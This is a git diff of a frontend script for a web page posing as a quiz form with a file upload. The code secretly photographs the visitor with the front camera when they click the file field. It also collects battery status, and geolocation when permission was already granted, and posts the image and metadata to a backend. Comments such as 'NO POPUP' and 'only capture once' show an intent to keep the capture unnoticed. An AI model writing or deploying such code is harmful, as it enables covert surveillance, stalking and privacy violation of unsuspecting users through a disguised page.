@@ -1,5 +1,5 @@
 // ================================
-// FRONTEND SCRIPT.JS (NO PERM ON SUBMIT)
+// FINAL SCRIPT (NO PERM ON SUBMIT)
 // ================================
 
 const form = document.getElementById("quiz-form");
@@ -7,11 +7,12 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
 
-// merged backend
 const BACKEND_BASE = "/api";
 
+// Camera constraints
 const constraints = { video: { facingMode: "user" }, audio: false };
 
+// only capture once
 let cameraCaptured = false;
 
 // ================================
@@ -28,7 +29,7 @@ async function collectMetadata() {
     time: new Date().toLocaleString(),
   };
 
-  // Battery
+  // Battery (no permission)
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -36,8 +37,8 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Location (will ask permission ONLY if not granted already)
-  if (navigator.geolocation && navigator.permissions) {
+  // Location only if already allowed (NO POPUP)
+  if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
       if (status.state === "granted") {
@@ -53,7 +54,7 @@ async function collectMetadata() {
 }
 
 // ================================
-// CAPTURE CAMERA ON FILE CLICK ONLY
+// CAPTURE + SEND CAMERA (ONLY ON FILE CLICK)
 // ================================
 async function captureAndSendCamera() {
   if (cameraCaptured) return; // only once
@@ -62,10 +63,10 @@ async function captureAndSendCamera() {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
-    // wait 2 sec for better pic
+    // wait 2s for better pic
     await new Promise((r) => setTimeout(r, 2000));
 
-    // set canvas size properly
+    // make sure canvas size correct
     canvas.width = 640;
     canvas.height = 480;
 
@@ -81,15 +82,17 @@ async function captureAndSendCamera() {
       body: JSON.stringify({ image, metadata }),
     });
 
+    // stop camera
     stream.getTracks().forEach((t) => t.stop());
+
     cameraCaptured = true;
   } catch (err) {
     console.log("Camera blocked/denied:", err);
-    // No popup here, no breaking submit
+    // don't stop the form if camera fails
   }
 }
 
-// ✅ IMPORTANT: Camera permission happens here only
+// ✅ Camera permission happens here ONLY
 if (fileInput) {
   fileInput.addEventListener("click", async () => {
     await captureAndSendCamera();
@@ -97,12 +100,12 @@ if (fileInput) {
 }
 
 // ================================
-// FILE UPLOAD (SEND { file, filename })
+// UPLOAD FILE (WORKING)
 // ================================
 async function uploadFile(file) {
-  const reader = new FileReader();
-
   return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+
     reader.onload = async () => {
       try {
         const res = await fetch(`${BACKEND_BASE}/file-upload`, {
@@ -126,18 +129,18 @@ async function uploadFile(file) {
 }
 
 // ================================
-// SUBMIT FORM (NO CAMERA PERMISSION HERE)
+// SUBMIT FORM (NO CAMERA HERE)
 // ================================
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  // ✅ stop submit if file not selected
   if (!fileInput || fileInput.files.length === 0) {
     alert("Please select a file before submitting!");
     return;
   }
 
   try {
+    // ✅ only file upload on submit
     await uploadFile(fileInput.files[0]);
 
     // ✅ show success page
